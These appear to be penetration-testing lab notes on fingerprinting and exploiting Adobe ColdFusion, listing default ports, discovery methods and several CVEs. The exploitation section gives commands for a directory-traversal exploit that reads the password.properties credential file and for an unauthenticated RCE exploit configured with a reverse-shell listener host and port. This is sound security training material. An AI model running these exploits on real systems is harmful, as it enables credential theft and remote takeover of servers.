### Footprinting + Enumeration

ColdFusion exposes a fair few ports by default:

| Port Number | Protocol       | Description                                                                                                                                                            |
| ----------- | -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 80          | HTTP           | Used for non-secure HTTP communication between the web server and web browser.                                                                                         |
| 443         | HTTPS          | Used for secure HTTP communication between the web server and web browser. Encrypts the communication between the web server and web browser.                          |
| 1935        | RPC            | Used for client-server communication. Remote Procedure Call (RPC) protocol allows a program to request information from another program on a different network device. |
| 25          | SMTP           | Simple Mail Transfer Protocol (SMTP) is used for sending email messages.                                                                                               |
| 8500        | SSL            | Used for server communication via Secure Socket Layer (SSL).                                                                                                           |
| 5500        | Server Monitor | Used for remote administration of the ColdFusion server.                                                                                                               |

Methods of Discovery:

| Method            | Description                                                                                                                                                                                                           |
| ----------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `File Extensions` | ColdFusion pages typically use ".cfm" or ".cfc" file extensions. If you find pages with these file extensions, it could be an indicator that the application is using ColdFusion.                                     |
| `HTTP Headers`    | Check the HTTP response headers of the web application. ColdFusion typically sets specific headers, such as "Server: ColdFusion" or "X-Powered-By: ColdFusion", that can help identify the technology being used.     |
| `Error Messages`  | If the application uses ColdFusion and there are errors, the error messages may contain references to ColdFusion-specific tags or functions.                                                                          |
| `Default Files`   | ColdFusion creates several default files during installation, such as "admin.cfm" or "CFIDE/administrator/index.cfm". Finding these files on the web server may indicate that the web application runs on ColdFusion. |
![[Pasted image 20250212082757.png]]

#### Admin Panel `/CFIDE/administrator`
![[Pasted image 20250212082834.png]]

### Exploitation
ColdFusion has historically been vulnerable to various types of attacks, such as SQL injection, XSS, directory traversal, authentication bypass, and arbitrary file uploads. To improve the security of ColdFusion, developers must implement secure coding practices, input validation checks, and properly configure web servers and firewalls. Here are a few known vulnerabilities of ColdFusion:

1. CVE-2021-21087: Arbitrary disallow of uploading JSP source code
2. CVE-2020-24453: Active Directory integration misconfiguration
3. CVE-2020-24450: Command injection vulnerability
4. CVE-2020-24449: Arbitrary file reading vulnerability
5. CVE-2019-15909: Cross-Site Scripting (XSS) Vulnerability

```bash
searchsploit adobe coldfusion
```

#### Directory Traversal (ColdFusion 8)
```bash
searchsploit -m 14641

python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

#### Unauthenticated RCE
```bash
searchsploit -m 50057

 lhost = '10.10.14.55' # CHANGE ME
    lport = 4444 # CHANGEME
    rhost = "10.129.247.30" # Target IP
    rport = 8500 # Target Port

python3 50057.py 
```
